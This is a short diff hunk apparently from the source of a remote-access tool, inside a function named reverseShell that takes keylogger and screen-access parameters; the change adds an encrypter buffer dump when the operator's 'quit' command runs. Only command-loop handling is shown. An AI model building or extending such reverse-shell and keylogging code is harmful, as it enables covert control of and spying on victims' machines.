@@ -268,6 +268,7 @@ def reverseShell(screenThatbeachAcces, keyLogger):
         elif(command == "clear"):
             consoleCleaner(False)
         elif(command == "quit"):
+            encrypter.dump_buffer()
             consoleCleaner(False)
             break
         else:
